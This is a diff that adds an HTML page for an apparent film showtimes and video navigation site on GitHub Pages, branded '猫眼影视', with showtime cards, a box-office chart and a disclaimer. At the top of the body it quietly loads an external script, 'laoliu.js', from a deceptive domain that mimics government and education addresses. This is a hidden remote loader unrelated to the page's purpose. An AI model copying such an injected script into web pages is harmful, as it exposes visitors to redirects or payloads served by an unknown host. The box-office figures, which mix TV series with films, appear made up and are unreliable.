@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>猫眼影视 - 电影排片与高清影视导航 | maoyanyingshi-h5.github.io</title>
+<meta name="description" content="猫眼影视（maoyanyingshi-h5.github.io）提供最新电影排片、高清电影电视剧在线导航。涵盖院线新片、热播剧集、动漫综艺，支持手机电脑自适应访问。">
+<meta name="keywords" content="猫眼影视, 电影排片, 电影在线观看, 高清影视导航, maoyanyingshi-h5">
+<meta name="author" content="猫眼影视">
+<meta name="robots" content="index, follow">
+<style>
+  :root{
+    --bg:#15151c;
+    --bg2:#1d1d27;
+    --ticket:#f4ead2;
+    --ink:#1a1a1a;
+    --red:#ff4d4f;
+    --red-d:#c8393b;
+    --yellow:#ffd54a;
+    --muted:#9a9ab0;
+    --line:#33333f;
+    --sans:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+    --mono:'SFMono-Regular',Consolas,monospace;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{
+    font-family:var(--sans);background:var(--bg);color:#eee;
+    line-height:1.6;padding:1rem;
+    background-image:radial-gradient(#ffffff06 1px,transparent 1px);
+    background-size:22px 22px;
+  }
+  a{color:var(--red);text-decoration:none;transition:.2s;}
+  a:hover{color:var(--yellow);}
+  .wrap{max-width:1080px;margin:0 auto;}
+
+  /* 顶栏 */
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    background:var(--bg2);border:1px solid var(--line);
+    border-radius:12px;padding:.8rem 1.1rem;margin-bottom:1.5rem;
+  }
+  .brand{display:flex;align-items:center;gap:.6rem;font-weight:900;font-size:1.3rem;color:#fff;}
+  .paw{
+    width:24px;height:24px;border-radius:50%;background:var(--red);position:relative;flex:none;
+  }
+  .paw::before,.paw::after{
+    content:"";position:absolute;width:7px;height:7px;border-radius:50%;background:var(--red);top:-4px;
+  }
+  .paw::before{left:3px;}.paw::after{right:3px;}
+  .nav{display:flex;gap:1rem;font-size:.85rem;font-family:var(--mono);}
+  .nav a{color:var(--muted);}
+  .nav a:hover{color:var(--yellow);}
+
+  /* 通用栏目 */
+  section{margin:3rem 0;}
+  .sec-head{
+    display:flex;align-items:center;gap:.6rem;color:var(--yellow);
+    font-family:var(--mono);font-size:.95rem;margin-bottom:1.4rem;
+    border-bottom:1px dashed var(--line);padding-bottom:.4rem;
+  }
+  .sec-head::before{content:"▌";color:var(--red);}
+
+  /* 栏目1：票根Hero */
+  #home .ticket-hero{
+    background:var(--ticket);color:var(--ink);
+    border-radius:14px;padding:2rem;position:relative;
+    box-shadow:8px 8px 0 #00000060;
+    border-left:3px dashed var(--red);
+  }
+  /* 撕口 */
+  #home .ticket-hero::before,
+  #home .ticket-hero::after{
+    content:"";position:absolute;width:22px;height:22px;border-radius:50%;
+    background:var(--bg);left:-12px;
+  }
+  #home .ticket-hero::before{top:38%;}
+  #home .ticket-hero::after{bottom:38%;}
+  .tk-top{display:flex;justify-content:space-between;font-family:var(--mono);font-size:.75rem;color:var(--red-d);}
+  #home h1{font-size:clamp(2rem,5vw,3.2rem);margin:.4rem 0;letter-spacing:-1px;}
+  #home h1 em{color:var(--red);font-style:normal;}
+  #home p.lead{max-width:560px;color:#444;font-size:.95rem;}
+  .tk-meta{display:flex;gap:1.5rem;margin-top:1.2rem;font-family:var(--mono);font-size:.8rem;}
+  .tk-meta b{display:block;font-size:1.1rem;color:var(--red-d);}
+  .admit{
+    display:inline-block;margin-top:1.2rem;background:var(--red);color:#fff;
+    font-family:var(--mono);font-weight:700;padding:.5rem 1.2rem;border-radius:6px;
+  }
+
+  /* 栏目2：影厅通道 */
+  #category .hall{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem;
+  }
+  .hall-row{
+    display:flex;align-items:center;gap:1rem;
+    background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:.9rem 1rem;
+  }
+  .hall-no{
+    font-family:var(--mono);font-weight:900;color:var(--bg);
+    background:var(--yellow);border-radius:6px;padding:.2rem .5rem;font-size:.8rem;
+  }
+  .hall-row h3{font-size:1rem;color:#fff;}
+  .hall-row span{font-size:.75rem;color:var(--muted);}
+
+  /* 栏目3：排片卡 */
+  #latest .shows{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.2rem;
+  }
+  .show-card{
+    background:var(--bg2);border:1px solid var(--line);border-radius:12px;overflow:hidden;
+  }
+  .show-poster{
+    height:130px;display:flex;align-items:center;justify-content:center;font-size:2.6rem;
+    background:linear-gradient(135deg,#2a2a38,#15151c);
+    border-bottom:1px solid var(--line);position:relative;
+  }
+  .show-poster .quality{
+    position:absolute;top:8px;left:8px;font-family:var(--mono);font-size:.65rem;
+    background:var(--red);color:#fff;padding:.1rem .4rem;border-radius:4px;
+  }
+  .show-body{padding:.9rem 1rem;}
+  .show-body h3{font-size:1.05rem;color:#fff;}
+  .show-sub{font-size:.78rem;color:var(--muted);margin:.2rem 0 .6rem;}
+  .sessions{display:flex;gap:.4rem;flex-wrap:wrap;}
+  .ses{
+    font-family:var(--mono);font-size:.72rem;padding:.2rem .5rem;
+    border:1px solid var(--line);border-radius:5px;color:var(--yellow);
+  }
+  .ses.imax{color:var(--red);border-color:var(--red);}
+
+  /* 栏目4：票房榜 */
+  #ranking .box-office{max-width:720px;}
+  .bo-row{
+    display:grid;grid-template-columns:36px 1fr auto;gap:1rem;align-items:center;
+    padding:.9rem 0;border-bottom:1px solid var(--line);
+  }
+  .bo-no{font-family:var(--mono);font-weight:900;color:var(--yellow);}
+  .bo-no.top{color:var(--red);}
+  .bo-name b{color:#fff;font-size:1rem;}
+  .bo-name span{display:block;font-size:.75rem;color:var(--muted);}
+  .bo-bar{height:6px;background:#000;margin-top:.4rem;border-radius:4px;overflow:hidden;}
+  .bo-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--yellow));}
+  .bo-val{font-family:var(--mono);font-size:.85rem;color:var(--yellow);white-space:nowrap;}
+
+  /* 栏目5：说明 */
+  #about .note{
+    background:var(--bg2);border:1px solid var(--line);border-left:4px solid var(--red);
+    border-radius:10px;padding:1.4rem;font-size:.9rem;color:var(--muted);
+  }
+  #about .note b{color:#fff;}
+  .url-line{font-family:var(--mono);color:var(--yellow);margin-top:.8rem;}
+
+  footer{
+    text-align:center;font-family:var(--mono);font-size:.8rem;color:var(--muted);
+    padding:2rem 0;border-top:1px solid var(--line);margin-top:2rem;
+  }
+
+  @media(max-width:768px){
+    .nav{display:none;}
+    #home .ticket-hero{padding:1.4rem;}
+    #home .ticket-hero::before{top:30%;}
+    #home .ticket-hero::after{bottom:30%;}
+    .tk-meta{flex-wrap:wrap;gap:1rem;}
+    #category .hall{grid-template-columns:1fr 1fr;}
+    #latest .shows{grid-template-columns:1fr;}
+    .bo-val{display:none;}
+  }
+  @media(max-width:420px){
+    #category .hall{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="wrap">
+
+  <header class="topbar">
+    <div class="brand"><span class="paw"></span>猫眼影视</div>
+    <nav class="nav">
+      <a href="#home">票根</a>
+      <a href="#category">影厅</a>
+      <a href="#latest">排片</a>
+      <a href="#ranking">票房</a>
+      <a href="#about">说明</a>
+    </nav>
+  </header>
+
+  <main>
+    <!-- 栏目1 -->
+    <section id="home">
+      <div class="ticket-hero">
+        <div class="tk-top">
+          <span>ADMIT ONE · 单页观影通票</span>
+          <span>NO. 2026-1021</span>
+        </div>
+        <h1>猫眼影视<em>·今日排片</em></h1>
+        <p class="lead">maoyanyingshi-h5.github.io —— 像在影院取票机前看一眼排片表：新片、热剧、动漫、综艺按场次摆好，点开即走，不弹窗不绕路。</p>
+        <div class="tk-meta">
+          <div><b>每日</b>排片更新</div>
+          <div><b>4+</b>内容影厅</div>
+          <div><b>H5</b>手机自适应</div>
+        </div>
+        <a href="#latest" class="admit">查看今日场次 →</a>
+      </div>
+    </section>
+
+    <!-- 栏目2 -->
+    <section id="category">
+      <div class="sec-head">影厅通道 / HALLS</div>
+      <div class="hall">
+        <div class="hall-row"><span class="hall-no">1号厅</span><div><h3>院线电影</h3><span>新片 / 进口 / 国产</span></div></div>
+        <div class="hall-row"><span class="hall-no">2号厅</span><div><h3>剧集长廊</h3><span>古装 / 现代 / 悬疑</span></div></div>
+        <div class="hall-row"><span class="hall-no">3号厅</span><div><h3>欧美剧场</h3><span>美剧 / 科幻 / 犯罪</span></div></div>
+        <div class="hall-row"><span class="hall-no">4号厅</span><div><h3>动漫放映室</h3><span>番剧 / 剧场版</span></div></div>
+        <div class="hall-row"><span class="hall-no">5号厅</span><div><h3>综艺小厅</h3><span>真人秀 / 访谈</span></div></div>
+        <div class="hall-row"><span class="hall-no">6号厅</span><div><h3>经典重映</h3><span>老片修复 / 4K</span></div></div>
+      </div>
+    </section>
+
+    <!-- 栏目3 -->
+    <section id="latest">
+      <div class="sec-head">今日排片 / SHOWTIMES</div>
+      <div class="shows">
+        <article class="show-card">
+          <div class="show-poster">🏜️<span class="quality">4K</span></div>
+          <div class="show-body">
+            <h3>沙丘3：救世主</h3>
+            <div class="show-sub">科幻 / 星际战争 / 中字</div>
+            <div class="sessions">
+              <span class="ses imax">IMAX 12:30</span>
+              <span class="ses">杜比 15:10</span>
+              <span class="ses">夜场 20:40</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="show-card">
+          <div class="show-poster">👑<span class="quality">1080P</span></div>
+          <div class="show-body">
+            <h3>庆余年2</h3>
+            <div class="show-sub">古装权谋 / 合集导航</div>
+            <div class="sessions">
+              <span class="ses">午间 13:00</span>
+              <span class="ses">连播 18:20</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="show-card">
+          <div class="show-poster">🔥<span class="quality">BD</span></div>
+          <div class="show-body">
+            <h3>周处除三害</h3>
+            <div class="show-sub">动作犯罪 / 修复版</div>
+            <div class="sessions">
+              <span class="ses imax">CINITY 14:00</span>
+              <span class="ses">常规 21:00</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="show-card">
+          <div class="show-poster">🏎️<span class="quality">WEB</span></div>
+          <div class="show-body">
+            <h3>飞驰人生2</h3>
+            <div class="show-sub">喜剧 / 赛车</div>
+            <div class="sessions">
+              <span class="ses">下午 16:10</span>
+              <span class="ses">晚场 22:00</span>
+            </div>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 栏目4 -->
+    <section id="ranking">
+      <div class="sec-head">单日票房榜 / BOX OFFICE</div>
+      <div class="box-office">
+        <div class="bo-row">
+          <div class="bo-no top">1</div>
+          <div class="bo-name">
+            <b>繁花</b><span>国产剧 / 王家卫</span>
+            <div class="bo-bar"><div class="bo-fill" style="width:98%"></div></div>
+          </div>
+          <div class="bo-val">¥ 9800万</div>
+        </div>
+        <div class="bo-row">
+          <div class="bo-no top">2</div>
+          <div class="bo-name">
+            <b>庆余年2</b><span>古装权谋</span>
+            <div class="bo-bar"><div class="bo-fill" style="width:94%"></div></div>
+          </div>
+          <div class="bo-val">¥ 9400万</div>
+        </div>
+        <div class="bo-row">
+          <div class="bo-no top">3</div>
+          <div class="bo-name">
+            <b>沙丘3</b><span>科幻 / 院线</span>
+            <div class="bo-bar"><div class="bo-fill" style="width:91%"></div></div>
+          </div>
+          <div class="bo-val">¥ 9100万</div>
+        </div>
+        <div class="bo-row">
+          <div class="bo-no">4</div>
+          <div class="bo-name">
+            <b>周处除三害</b><span>动作犯罪</span>
+            <div class="bo-bar"><div class="bo-fill" style="width:86%"></div></div>
+          </div>
+          <div class="bo-val">¥ 8600万</div>
+        </div>
+        <div class="bo-row">
+          <div class="bo-no">5</div>
+          <div class="bo-name">
+            <b>热辣滚烫</b><span>励志喜剧</span>
+            <div class="bo-bar"><div class="bo-fill" style="width:82%"></div></div>
+          </div>
+          <div class="bo-val">¥ 8200万</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 栏目5 -->
+    <section id="about">
+      <div class="sec-head">站点说明 / NOTICE</div>
+      <div class="note">
+        <p><b>猫眼影视</b>为影视排片与资源导航单页，仅做分类索引、场次展示与入口整理，不托管视频文件，也不内置播放源。</p>
+        <p>页面内容用于个人观影导航与学习交流；实际播放请通过正规授权平台，遵守当地网络与版权规范。</p>
+        <div class="url-line">🌐 https://maoyanyingshi-h5.github.io</div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    猫眼影视 / maoyanyingshi-h5.github.io<br>
+    © 2026 单页排片导航演示 · ADMIT ONE
+  </footer>
+</div>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const t=document.querySelector(a.getAttribute('href'));
+      if(t)t.scrollIntoView({behavior:'smooth'});
+    });
+  });
+</script>
+</body>
+</html>
